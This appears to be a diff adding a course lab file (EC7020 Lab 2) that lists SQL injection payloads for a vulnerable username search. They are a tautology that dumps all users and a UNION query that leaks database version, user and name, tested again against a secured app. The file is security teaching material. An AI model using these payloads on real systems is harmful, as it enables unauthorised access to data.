@@ -1,0 +1,19 @@
+========================================================
+EC7020 Lab 2 - SQL Injection payloads (Task d)
+Type these at the "Enter username to search:" prompt.
+========================================================
+
+--- Normal input (Task c) ---
+alice
+
+--- Injection 1: Tautology (OR 1=1) -> dumps ALL users ---
+' OR '1'='1
+
+--- Injection 2: UNION-based -> leaks DB version/user/name ---
+(keep the space after the -- )
+' UNION SELECT 1,@@version,current_user(),database(),'x' -- 
+
+========================================================
+For Task (e): run SecureApp and type the SAME two
+injection strings. Both should return 0 rows.
+========================================================
